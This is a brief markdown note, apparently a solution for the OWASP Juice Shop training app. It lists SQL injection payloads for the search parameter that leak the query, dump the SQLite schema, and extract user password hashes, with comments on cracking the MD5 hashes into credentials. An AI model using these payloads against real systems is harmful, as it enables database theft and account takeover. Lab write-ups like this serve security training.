# OWASP Juice Shop solution

## `search?q=`

```url
'+or+1%3d1+--
  # get error message. sqllite, original query used.
'+or+1%3d1))+UNION+SELECT+sql,name,3,4,5,6,7,8,9+FROM+sqlite_master+--
  # get schema
'+and+1%3d0))+UNION+SELECT+id,username,password,email,role,6,7,8,9+FROM+users+--
  # get password hash (MD5)
  # extract the hash with javascript
  # since MD5, reverse and get 3 sets of credentials
```
